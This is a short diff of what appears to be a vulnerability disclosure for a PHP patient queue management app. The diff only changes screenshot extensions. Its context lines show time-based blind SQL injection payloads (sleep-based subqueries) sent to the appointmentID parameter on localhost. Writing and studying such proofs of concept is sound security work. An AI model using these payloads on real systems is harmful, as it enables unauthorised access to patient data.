@@ -66,7 +66,7 @@ pqms/php/api_patient_schedule.php?appointmentID
    ```
    http://localhost/pqms/checkin.php?patient_id=11
    ``` 
-   ![Description of image](20260218-pqms-004.png)
+   ![Description of image](20260218-pqms-004.PNG)
    
 6. Use the following SQL payload (1):
    ```
@@ -77,7 +77,7 @@ pqms/php/api_patient_schedule.php?appointmentID
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(0)))a)%2b'
    ``` 
-   ![Description of image](20260218-pqms-005.png)
+   ![Description of image](20260218-pqms-005.PNG)
    
 8. Use the following SQL payload (2):
    ```
@@ -88,7 +88,7 @@ pqms/php/api_patient_schedule.php?appointmentID
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(20)))a)%2b'
    ``` 
-   ![Description of image](20260218-pqms-006.png)
+   ![Description of image](20260218-pqms-006.PNG)
 
 
 
